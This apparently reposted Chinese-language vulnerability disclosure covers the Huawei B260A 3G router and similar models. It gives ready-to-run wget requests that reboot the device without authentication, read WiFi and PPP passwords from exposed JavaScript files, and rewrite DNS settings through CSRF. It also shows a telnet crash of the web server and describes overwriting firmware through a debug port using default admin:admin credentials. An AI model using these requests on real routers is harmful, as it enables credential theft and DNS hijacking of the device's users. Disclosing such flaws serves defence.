> 原文链接: https://www.anquanke.com//post/id/82666 


# 华为3g路由器的综合性学习：xss,csrf,ddos,非认证的固件更新，远程代码执行


                                阅读量   
                                **106875**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t012df8b1fe93c1b543.png)](https://p5.ssl.qhimg.com/t012df8b1fe93c1b543.png)

**漏洞描述:<br>**

Huawei B260A 3G调制解调器因为有缺陷的安全设计引发一些安全漏洞,该设备在许多国家被广泛使用(比如沃达丰)

下面的测试固件版本是:846.11.15.08.115 (测试时的最新版)

该固件似乎也被用于华为的其他14种设备里([http://192.168.1.1/js/u_version.js),因此这些设备也有潜在的安全风险](http://192.168.1.1/js/u_version.js),%E5%9B%A0%E6%AD%A4%E8%BF%99%E4%BA%9B%E8%AE%BE%E5%A4%87%E4%B9%9F%E6%9C%89%E6%BD%9C%E5%9C%A8%E7%9A%84%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9)



```
E960, WLA1GCPU
E968, WLA1GCYU
B970, WLA1GAPU
B932, WLB1TIPU
B933, WLB1TIPU
B220, WLA1GCYU
B260, WLA1GCYU
B270, WLA1GCYU
B972, WLA1GCYU
B200-20, WLB3TILU
B200-30, WLB3TILU
B200-40, WLB3TILU
B200-50, WLB3TILU
??, WLA1GCPU
```



**漏洞细节:COOKIES**

Huawei B260A 在COOKIES里使用BASE64编码存储管理员的密码信息,这允许攻击者通过嗅探攻击来获取到cookies信息,然后轻易解码。

COOKIES类似:



```
Cookie: Basic=admin:base64(password):0
```



**漏洞细节:认证绕过**

通过下面的请求,可以不需要验证就远程重启设备



```
wget -qO- --post-data='action=Reboot&amp;page=resetrouter.asp' http://192.168.1.1/en/apply.cgi
```

这个请求可以实现



```
wget -qO- --post-data='action=Apply&amp;page=lancfg.asp' 'http://192.168.1.1/en/apply.cgi'
```

不需要验证获取WIKI密码



```
wget -qO- 'http://192.168.1.1/js/wlan_cfg.js'|less
```

不需要验证获取PPP拨号密码



```
wget -qO- 'http://192.168.1.1/js/connection.js'|grep -i 'var profile'
var profile = [["Orange TN","*99#","FIXME","FIXME","0","flyboxgp","1","","0",],[]];
```

不需要验证获取密码信息(wifi密码,ppp密码)



```
wget -qO- http://192.168.1.1/js/wizard.js
var current_profile_list = ["Orange TN","*99#","","","0","flyboxgp","1","",];
var profile = [["Orange TN","*99#","","","0","flyboxgp","1","",],[]];
var nv_wl_wpa_psk = "E56479874EB39DB3BC65D8374B";              /**/
var nv_wl_key1 = "";                    /**/
[...]
```

<br>

**漏洞细节:CSRF**

不需要验证修改远程的DNS,允许攻击者劫持DNS流量,影响客户端

```
wget -qO- --post-data='lan_lease=86400&amp;dns_settings=static&amp;primary_dns=1.1.3.1&amp;secondary_dns=3.3.3.3&amp;lan_proto=dhcp&amp;dhcp_start=192.168.1.100&amp;dhcp_end=192.168.1.200&amp;lan_ipaddr=192.168.1.1&amp;lan_gateway=192.168.1.1&amp;lan_netmask=255.255.255.0&amp;action=Apply&amp;page=lancfg.asp' 'http://192.168.1.1/en/apply.cgi'
```

这个请求也可用于CSRF攻击上

<br>

**漏洞细节:远程DOS**

不需要验证远程DOS其HTTP服务



```
root@linux:~# telnet 192.168.1.1 80
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.
x  
Connection closed by foreign host.
root@linux:~# telnet 192.168.1.1 80
Trying 192.168.1.1...
telnet: Unable to connect to remote host: Connection refused
root@linux:~
```

<br>

**漏洞细节:不需要验证上传固件**

1.使用官方工具TELNET连接(默认账号admin:admin)



```
HGW login: ......admin
Password: admin
No directory, logging in with HOME=/
BusyBox v0.60.0 (2013.02.20-03:27+0000) Built-in shell (msh)
Enter 'help' for a list of built-in commands.
# nvram get cfe_version
# nvram get app_version
#
```



2.在路由器,调试程序从TCP 1280端口接收数据,存储数据在/tmp目录,可以使用write覆写路由器的MTD

不需要逆向,我们在路由器里使用top命令,查看write进程



```
1266 0         S    diagd
1270 0         S    telnetd
1822 0         R    write /tmp/uploadh1wNSR FWT  &lt;-- 覆写MTD
```

write是基本的命令用来覆写mtdblock  (write /path/to/file device)

3.之后更新固件,你能使用admin/admin登录http控制面板和telnet控制台,允许你获取root shell

这是默认行为,FMC工具的官方文档有提及:



```
With this software, you can upgrade the Huawei FMC products in a very simple way.
This software supports the upgrade of five sub-modules, including BOOT of the router module,
APP of the router module, customized files of the router module, the wireless module,
and the dashboard software.
```

华为不对该设备提供直接的固件,你能从你的ISP下载

以下ISP使用这些路由器(来自[http://www.dlgsm.com/index.php?dir=/FLASH-FILES/HUAWEI/B_Series/B260a](http://www.dlgsm.com/index.php?dir=/FLASH-FILES/HUAWEI/B_Series/B260a))



```
Argentina Claro
Argentina Movistar
Armenia Orange
Austria H3G
Austria Mobilkom
Brazil VIVO
Brazil CTBC
Jamaica C&amp;W JAMAICA
CTBC Brazil
Chile Entel
Croatia Vipnet
Danmark Hi3G
Ecuador CNT
Estonia Elisa Eesti
Germany E-Plus
Guatemala Tigo
JAMAICA C&amp;W
Jamaica Digicel
Kenya Orange
Mali Orange
Mexico Telcel
Niger Orange
Portugal Optimus
Portugal VDF
Roumania Vodafone
Slovak Telekom
Slovak Orange
Sweden HI3G
Sweden TELE2
Sweden Tele2
Tele2 Germany
Telia Sweden
Tunisia Orange
```



根据我的研究,能够使用一个不要验证的固件覆盖默认的固件

其他有可能有该漏洞影响的设备:



```
E960, WLA1GCPU
E968, WLA1GCYU
B970, WLA1GAPU
B932, WLB1TIPU
B933, WLB1TIPU
B220, WLA1GCYU
B260, WLA1GCYU
B270, WLA1GCYU
B972, WLA1GCYU
B200-20, WLB3TILU
B200-30, WLB3TILU
B200-40, WLB3TILU
B200-50, WLB3TILU
??, WLA1GCPU
```
